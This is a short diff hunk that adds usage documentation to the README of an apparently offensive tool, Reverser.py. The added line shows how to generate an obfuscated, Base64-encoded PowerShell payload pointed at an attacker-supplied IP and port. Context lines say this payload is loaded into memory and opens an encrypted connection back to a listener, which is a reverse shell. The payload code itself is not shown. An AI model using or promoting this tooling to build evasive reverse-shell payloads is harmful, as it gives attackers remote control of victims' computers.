@@ -39,6 +39,10 @@ The encoded PS1 file will be loaded into memory and establish a connection to an
 This way, we can ensure that the communication is encrypted end-to-end.
 
 
+Creating only a PS1 file (obfuscated and Based64 encoded):
+```bash
+python3 Reverser.py -ip <Your_IP> -port <Your_PORT> -type ps1
+```
 
 Creating a BAT file with the tool and transferring it to the listener's directory:
 ```bash
